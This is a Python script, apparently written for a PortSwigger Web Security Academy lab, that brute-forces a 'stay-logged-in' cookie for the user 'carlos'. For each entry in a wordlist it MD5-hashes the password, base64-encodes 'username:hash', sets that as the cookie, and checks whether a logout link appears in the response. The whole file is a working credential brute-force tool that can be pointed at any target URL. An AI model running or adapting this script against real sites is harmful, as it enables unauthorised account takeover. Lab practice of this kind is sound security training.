"""
This script
"""

#!/usr/bin/env python3
import re
import requests
import sys
import argparse
import hashlib
import base64

#initialisation of variables
host = 'https://ac211f2e1e912f5c80d0102500800044.web-security-academy.net/'
login_url = host + 'login'
username = 'carlos'
wordlist = []
filePath = "/home/kali/auth/lab2_password.txt" # home/kali/Documents/pwk_lp1/mutated2.txt

def loginUser(username, hashedPassword, session):
    login_page = session.get(login_url,verify=False)   
    # encode string in base64
    stringToEncode = username + ":" + hashedPassword 

    sample_string_bytes = stringToEncode.encode("ascii") 
  
    base64_bytes = base64.b64encode(sample_string_bytes) 
    base64_string = base64_bytes.decode("ascii") 
    print("base64Encoded String: " + base64_string) 
    
    session.cookies.set('stay-logged-in', base64_string)
    
    login_result = session.get(host, allow_redirects = True,verify=False)
    return login_result 

# Reading input
parser = argparse.ArgumentParser()
parser.add_argument("--url", "-u", help="set target url")
parser.add_argument("--file", "-f", help="set passwords file")
args = parser.parse_args()

# Check args
if args.url:
    print("Set full url to " + args.url)
    login_url = args.url
    
if args.file:
    print("Set file to " + args.file)
    filePath = args.file

# Parsing words out of file 
f=open(filePath,"r")
lines=f.readlines()

# Generate passwords our of file
for pw in lines:
    wordlist.append(pw)
f.close()

# iterating over passwords
for password in wordlist:

    session = requests.Session()
    session.proxies={'https': 'http://localhost:8080'}
    
    password = password.rstrip()
    md5HashedPw = hashlib.md5(password.encode('utf-8'))
    print('[*] Trying pw: "{p}"'.format(p = password))
    print("- " + md5HashedPw.hexdigest())
    
    #login as valid user
    res = loginUser(username, md5HashedPw.hexdigest(), session)
    #try bruteforcing
    if '<a href="/logout">Log out</a>' in res.text: 
        print("********PASSWORD FOUND: " + username + "/" + password)
        sys.exit()